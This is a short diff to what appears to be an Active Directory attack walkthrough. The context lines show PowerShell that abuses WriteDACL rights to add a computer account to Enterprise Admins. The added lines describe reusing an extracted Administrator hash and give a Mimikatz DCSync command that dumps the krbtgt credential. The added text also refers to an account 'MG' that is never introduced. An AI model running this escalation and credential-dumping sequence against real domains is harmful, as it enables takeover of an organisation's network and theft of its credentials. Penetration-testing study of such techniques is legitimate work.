@@ -28,3 +28,9 @@ You have `WriteDACL` over a computer object. Use it to grant full control.
    ```powershell
    Add-ADGroupMember -Identity "Enterprise Admins" -Members comp01$
    ```
+   This sequence shows how to extract secrets using your new account (`MG`) and leverage the extracted `Administrator` hash for privileged access.
+   Or
+   Use Mimikatz or similar tools to execute the DCSync attack:
+   ```powershell
+   mimikatz # lsadump::dcsync /user:krbtgt
+   ```
